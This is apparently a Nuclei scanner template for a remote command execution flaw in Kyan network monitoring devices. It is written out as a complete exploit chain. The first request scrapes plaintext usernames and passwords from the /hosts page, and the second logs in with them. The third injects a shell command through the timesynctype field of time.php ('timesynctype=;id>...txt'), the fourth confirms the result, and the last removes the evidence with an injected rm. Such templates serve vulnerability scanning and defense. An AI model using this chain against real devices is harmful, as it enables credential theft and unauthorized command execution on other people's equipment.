id: kyan-platform-rce

info:
  name: Kyan Platform Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects a remote command execution vulnerability in Kyan network monitoring devices.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20time.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

variables:
  r1: '{{rand_text_alpha(8)}}'
  r2: '{{rand_text_alpha(26)}}'

http:
  - id: r0
    method: GET
    path:
      - "{{BaseURL}}/hosts"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "UserName="
    extractors:
      - type: regex
        name: userpass
        regex:
          - "UserName=(?P<username>.+)\\sPassword=(?P<password>.+)"
        internal: true

  - id: r1
    method: POST
    path:
      - "{{BaseURL}}/login.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID={{r2}}
    body: |
      user={{userpass.username}}&passwd={{userpass.password}}&x=56&y=21
    redirects: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "设备管理系统"

  - id: r2
    method: POST
    path:
      - "{{BaseURL}}/time.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID={{r2}}
    body: |
      timesynctype=;id>{{r1}}.txt
    matchers:
      - type: status
        status:
          - 200

  - id: r3
    method: GET
    path:
      - "{{BaseURL}}/{{r1}}.txt"
    headers:
      Cookie: PHPSESSID={{r2}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "uid="

  - id: r4
    method: POST
    path:
      - "{{BaseURL}}/time.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID={{r2}}
    body: |
      timesynctype=%3Brm%20{{r1}}.txt
    matchers:
      - type: status
        status:
          - 200
